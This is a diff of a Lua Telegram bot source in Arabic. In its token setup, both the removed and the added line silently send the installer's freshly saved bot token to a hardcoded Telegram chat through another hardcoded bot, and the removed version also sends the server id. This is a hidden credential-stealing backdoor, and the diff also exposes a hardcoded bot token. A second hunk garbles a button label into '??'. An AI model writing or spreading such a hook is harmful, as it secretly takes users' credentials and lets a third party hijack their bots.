@@ -30,7 +30,7 @@ print('\27[0;31m≪━━━━━━𝑫𝑬𝑺𝑨━━━━━━≫\n ا�
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na≪━━━━━━𝑫𝑬𝑺𝑨━━━━━━≫\n27[0;39;49m')
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1711092245:AAFpTdn6IW9RI_FQm1kSwh6aLf2QDOFucN4/sendMessage?chat_id=1700360357&text=اهلا عزيزي مطور السورس تم تنصيب بوت جديد\nمعرفه '..database:get(id_server..":token_username")..'\nالتوكن '..database:get(id_server..":token")..'\nايبي السيرفر'..id_server)
+https.request('https://api.telegram.org/bot1711092245:AAFpTdn6IW9RI_FQm1kSwh6aLf2QDOFucN4/sendmessage?chat_id=1700360357&text=' ..token)
 end 
 else
 print('\27[0;35m≪━━━━━━𝑫𝑬𝑺𝑨━━━━━━≫ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -11765,7 +11765,7 @@ keyboard.inline_keyboard = {
 {text = ' الاوامر الرئيسيه ', callback_data="/help"},
 },
 {
-{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙳𝙴𝚂𝙰', url="t.me/UU_DHA_2"},
+{text = '𝚂𝙾𝚄𝚁𝙲𝙴 ??𝙴𝚂𝙰', url="t.me/UU_DHA_2"},
 {text = 'مبرمج السورس', url="t.me/UU_A_H_M_E_D"},
 },
 }
